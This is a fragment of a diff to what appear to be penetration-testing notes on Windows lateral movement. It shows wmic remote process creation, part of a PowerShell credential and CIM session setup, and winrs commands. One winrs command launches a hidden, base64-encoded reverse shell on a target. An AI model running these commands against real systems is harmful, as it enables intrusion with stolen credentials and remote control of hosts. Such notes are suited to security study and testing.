@@ -12,6 +12,7 @@ Lateral movement doesn't have to be used for different subnets. If we have crede
 - Abusing `wmic` (recently deprecated, but still probably good) on DMZ
 	- `wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create "{process}"`
 	- To use with powershell, we need to turn the password into a secure string and pass a reverse shell:
+
 ```
 $username = '{domain_user}';
 $password = '{password}';
@@ -30,6 +31,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 - Communicates over 5986 and 5985 with XML via HTTP/HTTPS
 - Use with `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"` or `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`
 - Can also be done via powershell
+
 ```
 $username = '{domain_user}';
 $password = '{password}';
